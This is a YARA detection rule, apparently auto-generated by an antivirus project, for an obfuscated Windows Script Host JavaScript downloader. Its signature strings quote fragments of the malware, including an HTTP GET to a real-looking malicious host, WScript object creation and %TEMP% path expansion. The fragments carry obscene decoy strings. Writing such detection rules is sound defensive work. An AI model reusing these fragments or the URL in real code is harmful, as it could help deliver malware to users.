rule sig_20160428_599abbb7317a38073a9554a105fae724 {
  meta:
    description = "datamaliciousorder - file 20160428_599abbb7317a38073a9554a105fae724.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9430dd8d7914070c259016746573d4eea57bdd34877ad7dbe907c058eac35cdb"

  strings:
    $s1  = "LzoZgbPzrWqaEnlKpxSks[WhhLimJfeWjoRsmGgbJet](\"G\" + \"ET\", \"http://yury2.nichost.ru/i7dksa\", false);" fullword ascii
    $s2  = "function MdpHfnZnwZuuFtyAuwBdz(LbdShaVstDvuAgeAruUvf){YxdPstPqhCzdMjlUjlPyk[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function MdpHfnZnwZuuFtyAuwBdz(LbdShaVstDvuAgeAruUvf){YxdPstPqhCzdMjlUjlPyk[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function XxiJyjHjdOjrBfcIhrKgh() {return YxdPstPqhCzdMjlUjlPyk[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s5  = "var YxdPstPqhCzdMjlUjlPyk = function SohKoxFmyWrdBzvLjlUdx() {return JrhLyfEzmJlfDdtColEro[HspFroYruPkeHyeCefGht](\"WScript\"+\"" ascii
    $s6  = "return IhcHypAigDakMivKfbBze - IxrPcgAmmRpiZjpHvzNvn;};" fullword ascii
    $s7  = "function PpvMkfYguWplIwsCyjLut(IhcHypAigDakMivKfbBze, IxrPcgAmmRpiZjpHvzNvn){ZciTyoXmfQekIhgKfeIjr = ZciTyoXmfQekIhgKfeIjr * 1; " ascii
    $s8  = "var YxdPstPqhCzdMjlUjlPyk = function SohKoxFmyWrdBzvLjlUdx() {return JrhLyfEzmJlfDdtColEro[HspFroYruPkeHyeCefGht](\"WScript\"+\"" ascii
    $s9  = "var JrhLyfEzmJlfDdtColEro = this[\"WScript\"];" fullword ascii
    $s10 = "function XxiJyjHjdOjrBfcIhrKgh() {return YxdPstPqhCzdMjlUjlPyk[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function AhqBwpTswTjhYkvNmsGub(VhgOsvYtnRhpYblEfgJsr) {var DpeYefLmtLfzFrwDisRai = (1, 2, 3, 4, 5, VhgOsvYtnRhpYblEfgJsr); retur" ascii
    $s12 = "function AhqBwpTswTjhYkvNmsGub(VhgOsvYtnRhpYblEfgJsr) {var DpeYefLmtLfzFrwDisRai = (1, 2, 3, 4, 5, VhgOsvYtnRhpYblEfgJsr); retur" ascii
    $s13 = "function TkdAdrAbpSftOrpGwwRjq(){return IbgWesTlaMsvItwTfsGyy + \"\";};" fullword ascii
    $s14 = "function PpvMkfYguWplIwsCyjLut(IhcHypAigDakMivKfbBze, IxrPcgAmmRpiZjpHvzNvn){ZciTyoXmfQekIhgKfeIjr = ZciTyoXmfQekIhgKfeIjr * 1; " ascii
    $s15 = "if (LzoZgbPzrWqaEnlKpxSks[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s16 = "function EniKvtEpiMdeSwtJklOwk() {return ((VvrPueGzoRkxDbfQhuVyx == true) && (VvrPueGzoRkxDbfQhuVyx == FhyLdyOlmBdgUraAdoQhk)) ?" ascii
    $s17 = "function EniKvtEpiMdeSwtJklOwk() {return ((VvrPueGzoRkxDbfQhuVyx == true) && (VvrPueGzoRkxDbfQhuVyx == FhyLdyOlmBdgUraAdoQhk)) ?" ascii
    $s18 = "function LgcXoeJliOxhWdjJseZrw(){return HspFroYruPkeHyeCefGht;};" fullword ascii
    $s19 = "}while (RplOuaJyfKenIzsWelBaw);" fullword ascii
    $s20 = "return PpvMkfYguWplIwsCyjLut(1 == 1 ? VqaZlaFryVvyMeqPixLai : 0, 1 == 1 ? TawGuoNfcBkbLhwWbpRtn : 0);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}